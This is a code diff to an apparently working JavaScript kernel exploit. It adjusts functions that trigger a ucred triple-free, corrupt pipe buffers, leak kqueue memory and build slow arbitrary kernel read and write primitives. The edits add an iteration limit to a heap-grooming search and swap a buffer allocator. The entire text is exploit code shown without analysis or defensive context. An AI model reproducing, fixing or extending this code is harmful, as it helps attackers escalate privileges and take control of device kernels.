@@ -824,9 +824,13 @@ function find_twins() {
     //throw new Error("find_twins failed");
 }
 
-function find_triplet(master, other) {
+function find_triplet(master, other, iterations) {
     debug("Enter find_triplet (" + master + ") (" + other + ")" );
     
+    if(typeof iterations === 'undefined') {
+        iterations = MAX_ROUNDS_TRIPLET;
+    }
+
     var count = 0;
     var val;
     var tag;
@@ -837,7 +841,7 @@ function find_triplet(master, other) {
     const spray_add = spray_rthdr.add(0x04);
     const leak_add = leak_rthdr.add(0x04);
 
-    while (count < MAX_ROUNDS_TRIPLET) {
+    while (count < iterations) {
         if (count % 100 == 0) {
             debug("find_triplet iteration: " + count);
         }
@@ -917,7 +921,7 @@ function netctrl_exploit() {
     debug("victimRpipeData: " + hex(victimRpipeData));
 
     // Corrupt pipebuf of masterRpipeFd.
-    masterPipebuf = new Buffer(PIPEBUF_SIZE);
+    masterPipebuf = malloc(PIPEBUF_SIZE);
     write32(masterPipebuf.add(0x00), 0);                // cnt
     write32(masterPipebuf.add(0x04), 0);                // in
     write32(masterPipebuf.add(0x08), 0);                // out
@@ -940,6 +944,9 @@ function trigger_ucred_triplefree() {
     write64(msgIov.add(0x8), 1); // iov_len
 
     do {
+        
+        //debug('    Memory: avail=' + debugging.info.memory.available + ' dmem=' + debugging.info.memory.available_dmem + ' libc=' + debugging.info.memory.available_libc);
+    
         var dummy_socket = socket(AF_UNIX, SOCK_STREAM, 0);
 
         // Register dummy socket.
@@ -1091,6 +1098,7 @@ function trigger_ucred_triplefree() {
 }
 
 function leak_kqueue() {
+    //debug('    Memory: avail=' + debugging.info.memory.available + ' dmem=' + debugging.info.memory.available_dmem + ' libc=' + debugging.info.memory.available_libc);
     debug("Leaking kqueue...");
 
     // Free one.
@@ -1158,7 +1166,7 @@ function build_uio(uio, uio_iov, uio_td, read, addr, size) {
   }
 
 function kreadslow(addr, size) {
-
+    //debug('    Memory: avail=' + debugging.info.memory.available + ' dmem=' + debugging.info.memory.available_dmem + ' libc=' + debugging.info.memory.available_libc);
     debug("Enter kreadslow addr: " + hex(addr) + " size : " + size);
 
     // Prepare leak buffers.
@@ -1258,7 +1266,7 @@ function kreadslow(addr, size) {
         debug("I read from leak_buffers[" + i + "] : " + hex(val) );
         if (!val.eq(tag_val)) {
             // Find triplet.
-            triplets[1] = find_triplet(triplets[0], -1);
+            triplets[1] = find_triplet(triplets[0], -1, 500);
             leak_buffer = leak_buffers[i].add(0);
             debug("This is leak_buffer " + hex(leak_buffer) + " - " + hex(read64(leak_buffer)));
         }
@@ -1271,7 +1279,7 @@ function kreadslow(addr, size) {
     write(iov_sock_1, tmp, 1);
 
     // Find triplet.
-    triplets[2] = find_triplet(triplets[0], triplets[1]);
+    triplets[2] = find_triplet(triplets[0], triplets[1], 500);
 
     // Let's make sure that they are indeed triplets
     var leak_0 = malloc(8);
@@ -1294,7 +1302,7 @@ function kreadslow(addr, size) {
 }
 
 function kwriteslow(addr, buffer, size) {
-
+    //('    Memory: avail=' + debugging.info.memory.available + ' dmem=' + debugging.info.memory.available_dmem + ' libc=' + debugging.info.memory.available_libc);
     debug("Enter kwriteslow addr: " + hex(addr) + " buffer: " + hex(buffer) + " size : " + size);
 
     // Set send buf size.
@@ -1364,7 +1372,7 @@ function kwriteslow(addr, buffer, size) {
     }
 
     // Find triplet.
-    triplets[1] = find_triplet(triplets[0], -1);
+    triplets[1] = find_triplet(triplets[0], -1, 500);
 
     // Workers should have finished earlier no need to wait
     wait_uio_writev();
@@ -1373,7 +1381,7 @@ function kwriteslow(addr, buffer, size) {
     write(iov_sock_1, tmp, 1);
 
     // Find triplet.
-    triplets[2] = find_triplet(triplets[0], triplets[1]);
+    triplets[2] = find_triplet(triplets[0], triplets[1], 500);
 
     // Workers should have finished earlier no need to wait
     wait_iov_recvmsg();
